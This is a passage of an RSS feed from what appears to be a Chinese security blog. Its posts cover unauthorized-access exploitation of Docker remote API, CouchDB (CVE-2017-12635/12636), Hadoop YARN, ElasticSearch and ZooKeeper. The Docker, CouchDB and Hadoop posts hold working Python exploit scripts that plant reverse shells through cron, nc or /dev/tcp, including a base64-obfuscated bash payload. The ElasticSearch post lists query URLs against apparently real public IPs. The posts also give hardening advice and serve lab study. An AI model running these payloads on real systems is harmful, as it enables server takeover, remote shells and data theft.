/bin/sh</span><br><span class="line"></span><br><span class="line">远程命令运行容器使用 -v 参数将宿主机 /etc 目录挂载到容器 /mnt/setc 目录</span><br><span class="line">随后写入定时任务命令反弹shell</span><br><span class="line">/etc/crontab   ,也可以挂载 /var/spool/cron/ 写入定时任务反弹shell</span><br><span class="line">docker -H tcp://192.168.56.117:2375 run -it -v /etc:/mnt/setc alpine:latest /bin/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">py poc 代码</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">import docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://192.168.56.117:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, r<span class="string">&#x27;&#x27;</span><span class="string">&#x27;sh -c &quot;echo &#x27;</span>* * * * * /usr/bin/nc 192.168.56.1 1111 -e /bin/sh<span class="string">&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;</span><span class="string">&#x27;&#x27;</span>, remove=True, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul><li>在不必需的情况下，不要启用 docker 的 remote api 服务，如果必须使用的话，可以采用如下的加固方式：</li><li>设置 ACL，仅允许信任的来源 IP 连接；</li><li>设置 TLS 认证，官方的文档为 Protect the Docker daemon socket</li><li>客户端连接时需要设置以下环境变量 export DOCKER_TLS_VERIFY&#x3D;1</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export DOCKER_CERT_PATH=~/.docker</span><br><span class="line">export DOCKER_HOST=tcp://10.10.10.10:2375</span><br><span class="line">export DOCKER_API_VERSION=1.12</span><br></pre></td></tr></table></figure><ul><li>在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://paper.seebug.org/409/#0x010-docker">https://paper.seebug.org/409/#0x010-docker</a></li><li><a href="https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md</a></li><li><a href="https://0a00.github.io/2022/11/26/docker1/">https://0a00.github.io/2022/11/26/docker1/</a></li></ul></div></div></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</category>
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/Docker/">Docker</category>
      
      
      <category domain="https://0a00.github.io/tags/Docker/">Docker</category>
      
      
      <comments>https://0a00.github.io/2023/05/18/Docker/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Couchdb 未授权访问</title>
      <link>https://0a00.github.io/2023/05/17/Couchdb/</link>
      <guid>https://0a00.github.io/2023/05/17/Couchdb/</guid>
      <pubDate>Wed, 17 May 2023 11:44:09 GMT</pubDate>
      
      <description>Couchdb 未授权访问</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><div class="timeline purple"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-17</p></div></div><div class='timeline-item-content'><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><p>CouchDB 默认在 5984 端口开放 Restful 的 API 接口，用于数据库的管理功能。其 HTTP Server 默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过 API 访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关 API 对服务器上的数据进行任意的增删改查，其中通过 API 修改 local.ini 配置文件，可进一步导致执行任意系统命令，获取服务器权限！</p><h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>使用 vulhub 搭建</p><p>启动完成后，访问<code>http://your-ip:5984/</code>即可看到Couchdb的欢迎页面。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a><strong>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</strong></h3><p>任意用户创建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">数据包中发送两个 roles 数据包，可绕过限制，建立用户</span><br><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;vulhub&quot;</span>,</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [<span class="string">&quot;_admin&quot;</span>],</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;vulhub&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a><strong>Couchdb 任意命令执行漏洞（CVE-2017-12636）</strong></h3><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。</p><p><strong>利用条件</strong></p><p>影响版本：小于 1.7.0 以及 小于 2.1.1</p><p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>先增加一个管理员用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">利用方式</span><br><span class="line">使用msf模块：linux/http/apache_couchdb_cmd_exec</span><br><span class="line"></span><br><span class="line">poc 代码</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://your-ip/:5984&#x27;</span></span><br><span class="line"><span class="built_in">command</span> = rb<span class="string">&quot;&quot;</span><span class="string">&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">version = 1</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">&#x27;/_users/org.couchdb.user:wooyun&#x27;</span>, data=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;wooyun&quot;,</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="string">  &quot;password&quot;: &quot;wooyun&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">&#x27;wooyun&#x27;</span>, <span class="string">&#x27;wooyun&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> = <span class="string">&quot;bash -c &#x27;&#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span> % base64.b64encode(<span class="built_in">command</span>).decode()</span><br><span class="line"><span class="keyword">if</span> version == 1:</span><br><span class="line">    session.put(target + (<span class="string">&#x27;/_config/query_servers/cmd&#x27;</span>), data=json.dumps(<span class="built_in">command</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">&#x27;/_membership&#x27;</span>).json()[<span class="string">&#x27;all_nodes&#x27;</span>][0]</span><br><span class="line">    session.put(target + <span class="string">&#x27;/_node/&#123;&#125;/_config/query_servers/cmd&#x27;</span>.format(host), data=json.dumps(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun&#x27;</span>)</span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == 1:</span><br><span class="line">    session.post(target + <span class="string">&#x27;/wooyun/_temp_view?limit=10&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">&#x27;/wooyun/_design/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul><li>指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 文件中找到 “bind_address &#x3D; 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</li><li>设置访问密码 （需要重启CouchDB才能生效） 在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 中找到“[admins]”字段配置密码</li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://paper.seebug.org/409/#0x09-couchdb">https://paper.seebug.org/409/#0x09-couchdb</a></li><li><a href="https://vulhub.org/#/environments/couchdb/CVE-2017-12636/">https://vulhub.org/#/environments/couchdb/CVE-2017-12636/</a></li></ul></div></div></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</category>
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/Couchdb/">Couchdb</category>
      
      
      <category domain="https://0a00.github.io/tags/Couchdb/">Couchdb</category>
      
      
      <comments>https://0a00.github.io/2023/05/17/Couchdb/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hadoop 未授权访问</title>
      <link>https://0a00.github.io/2023/05/17/Hadoop/</link>
      <guid>https://0a00.github.io/2023/05/17/Hadoop/</guid>
      <pubDate>Wed, 17 May 2023 11:35:33 GMT</pubDate>
      
      <description>Hadoop 未授权访问RCE</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>学习记录</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><div class="timeline orange"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-17</p></div></div><div class='timeline-item-content'><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>由于服务器直接在开放了 Hadoop 机器 的多个 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p><p>ResourceManager 默认端口8088   </p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用 vulhub 搭建靶场环境</p><p>地址：<a href="https://vulhub.org/#/environments/hadoop/unauthorized-yarn/">https://vulhub.org/#/environments/hadoop/unauthorized-yarn/</a></p><p>下载环境，进入漏洞环境目录执行：<code>docker-compose up -d</code> 启动安装启动环境</p><p>环境启动后，访问<code>http://your-ip:8088</code>即可看到Hadoop YARN ResourceManager WebUI页面。</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>调用 New Application API 创建 Application 进行代码注入，反弹shell。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><ul><li>启动 msfconsole</li><li>search hadoop</li><li>use linux&#x2F;http&#x2F;hadoop_unauth_exec</li><li>设置目标ip，本地监听ip</li><li>exploit</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">py poc 代码</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.0.1&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure><h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul><li>关闭hadoop web 管理页面</li><li>开启身份验证，防止未授权用户访问</li><li>设置防火墙安全组策略，禁止端口公网访问，限制可信ip</li></ul><h1 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h1><p><a href="https://vulhub.org/#/environments/hadoop/unauthorized-yarn/">https://vulhub.org/#/environments/hadoop/unauthorized-yarn/</a></p><p><a href="https://paper.seebug.org/409/#0x08-hadoop">https://paper.seebug.org/409/#0x08-hadoop</a></p></div></div></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</category>
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/Hadoop/">Hadoop</category>
      
      
      <category domain="https://0a00.github.io/tags/Hadoop/">Hadoop</category>
      
      
      <comments>https://0a00.github.io/2023/05/17/Hadoop/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ElasticSearch 未授权访问</title>
      <link>https://0a00.github.io/2023/05/16/ElasticSearch/</link>
      <guid>https://0a00.github.io/2023/05/16/ElasticSearch/</guid>
      <pubDate>Tue, 16 May 2023 12:15:53 GMT</pubDate>
      
      <description>ElasticSearch 未授权访问</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-16</p></div></div><div class='timeline-item-content'><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Elasticsearch 是一款 java 编写的企业级搜索服务。越来越多的公司使用 ELK 作为日志分析，启动此服务默认会开放9200端口，可被非法操作数据。</p><p>漏洞检测：默认端口9200</p><p>相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。</p><p>返回内容中包含”You Know, for Search”</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">利用接口</span><br><span class="line">http://x.x.x.x:9200/_nodes</span><br><span class="line">http://x.x.x.x:9200/_river</span><br><span class="line">http://101.198.161.130:9200/_cat/indices/</span><br><span class="line">http://101.198.161.130:9200/_plugin/head/</span><br><span class="line">http://101.198.161.130:9200/_nodes?prettify</span><br><span class="line">http://101.198.161.130:9200/_status</span><br><span class="line">http://101.198.161.130:9200/_search?pretty</span><br><span class="line">http://10.203.9.131:9200/zjftu/</span><br><span class="line">http://10.203.9.131:9200/zjftu/_search?pretty</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ul><li>关闭9200端口</li><li>防火墙规则限制禁止外网访问端口</li><li>设置端口账号认证</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://blkstone.github.io/2017/09/27/elasticsearch-unauthorized-access/">http://blkstone.github.io/2017/09/27/elasticsearch-unauthorized-access/</a></p><p><a href="http://blkstone.github.io/2017/09/27/elasticsearch-unauthorized-access/">http://blkstone.github.io/2017/09/27/elasticsearch-unauthorized-access/</a></p></div></div></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</category>
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/ElasticSearch/">ElasticSearch</category>
      
      
      <category domain="https://0a00.github.io/tags/ElasticSearch/">ElasticSearch</category>
      
      
      <comments>https://0a00.github.io/2023/05/16/ElasticSearch/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ZooKeeper 未授权访问</title>
      <link>https://0a00.github.io/2023/05/16/zookeeper/</link>
      <guid>https://0a00.github.io/2023/05/16/zookeeper/</guid>
      <pubDate>Tue, 16 May 2023 11:48:16 GMT</pubDate>
      
      <description>ZooKeeper 未授权访</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-16</p></div></div><div class='timeline-item-content'><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Zookeeper 的默认开放端口是2181。Zookeeper 安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用 Zookeeper，通过服务器收集敏感信息或者在 Zookeeper 集群内进行破坏</p><p>比如：kill命令。攻击者能够执行所有只允许由管理员运行的命令。</p><p>默认运行在 2181 端口</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14-bin.tar.gz</span><br><span class="line"></span><br><span class="line">tar -xvf  filename.tar.gz  解包</span><br><span class="line"><span class="built_in">cd</span>  zookeeper/src       </span><br><span class="line"><span class="built_in">mv</span> zoo_sample.cfg zoo.cfg   进入目录修改配置文件名称未zoo.cfg</span><br><span class="line">../bin/zkServer.sh start 启动服务</span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> conf | nc xx.xx.xx.xx 2181   </span><br><span class="line">conf命令输出相关服务配置的详细信息，端口、数据路径、日志路径、session 超时时间，最大连接数等。</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> cons | nc xx.xx.xx.xx 2181 | more</span><br><span class="line">列出所有连接到当前服务器的客户端/会话的详细信息</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> dump | nc xx.xx.xx.xx 2181 | more</span><br><span class="line">输出未处理的会话和临时节点，leader 节点有效。</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> envi | nc xx.xx.xx.xx 2181</span><br><span class="line">输出服务器详细信息</span><br><span class="line"></span><br><span class="line">./zkCli.sh -server x.x.x.x:2181  </span><br><span class="line">直接连接服务测试，执行命令</span><br></pre></td></tr></table></figure><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul><li>禁止把 Zookeeper 直接暴露在公网</li><li>添加访问控制，根据情况选择对应方式（认证用户，用户名密码）</li><li>绑定指定 IP 访问</li></ul></div></div></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</category>
      
